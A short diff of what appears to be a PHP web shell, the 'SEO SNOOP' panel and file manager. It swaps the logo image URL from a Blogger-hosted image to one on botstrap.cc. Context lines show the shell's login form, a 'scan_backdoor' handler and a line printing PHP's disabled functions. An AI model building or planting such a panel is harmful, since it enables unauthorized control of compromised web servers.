@@ -75,7 +75,7 @@ if (!isset($_SESSION['logged_in'])) {
     </head>
     <body>
         <form method="POST" class="login-box">
-            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgvlGpofT64rlRF10gjT6NTnJGPX0I3gcvAzf9wlWpl2akaj-5T7_H5q3eS5QBTMp8xPZZg7EyPBmOOpw1phYlaUgDbl-ze45HEpKmDeseQb2Kh_2qy2p3aK0rs2FiNh_InWeC3me9WdcburpypGuYIYl-hPqAw5Ivf1z706aNG2pGMdjudMb41xczaCrxT/s16000/snoopseo2.png" alt="SEO SNOOP">
+            <img src="https://botstrap.cc/image/skylight.png" alt="SEO SNOOP">
             <h2>SEO SNOOP PANEL</h2>
             <input type="text" name="username" placeholder="Username" required>
             <input type="password" name="password" placeholder="Password" required>
@@ -517,7 +517,7 @@ if (isset($_POST['scan_backdoor'])) {
 <body>
 <?php echo "<pre>Disable Functions: " . ini_get('disable_functions') . "</pre>"; ?>
 <div style="text-align:center; margin-bottom: 20px;">
-    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgvlGpofT64rlRF10gjT6NTnJGPX0I3gcvAzf9wlWpl2akaj-5T7_H5q3eS5QBTMp8xPZZg7EyPBmOOpw1phYlaUgDbl-ze45HEpKmDeseQb2Kh_2qy2p3aK0rs2FiNh_InWeC3me9WdcburpypGuYIYl-hPqAw5Ivf1z706aNG2pGMdjudMb41xczaCrxT/s16000/snoopseo2.png" alt="SEO SNOOP" style="max-width:200px; border-radius:10px; box-shadow:0 0 15px #ff0000ff;">
+    <img src="https://botstrap.cc/image/skylight.png" alt="SEO SNOOP" style="max-width:200px; border-radius:10px; box-shadow:0 0 15px #ff0000ff;">
     <h1 style="color:#0f0; font-family:monospace; text-shadow: 0 0 10px rgba(255, 0, 0, 1);">SNOOP FILE MANAGER</h1>
 </div>
 <p><a href="?logout=1">Logout</a></p>
